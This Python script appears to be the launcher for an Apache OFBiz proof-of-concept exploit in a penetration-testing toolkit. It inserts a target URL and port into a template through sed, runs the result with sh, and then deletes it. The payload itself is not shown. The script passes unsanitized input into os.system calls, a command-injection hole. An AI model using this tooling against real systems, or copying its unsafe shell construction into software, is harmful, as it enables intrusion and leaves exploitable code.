# -*- coding: utf-8 -*-
import os
import json

#PATH
path = os.getcwd()
syscache = (path+'/cache')
ofbiz = (path+'/core/poc/ofbiz')

os.system("cp %s/standard %s/final_execute"%(ofbiz,ofbiz))

target = open(syscache + '/url.log','r')
target = target.read()
print("[+] Target:",target)

port = input("[+] Please input port:")
print("[+] Port:",port)



os.system("sed -i 's/<url>/%s/g' %s/final_execute"%(target,ofbiz))
os.system("sed -i 's/<port>/%s/g' %s/final_execute"%(port,ofbiz))



os.system("sh %s/final_execute"%(ofbiz))
os.system("rm -rf %s/final_execute"%(ofbiz))
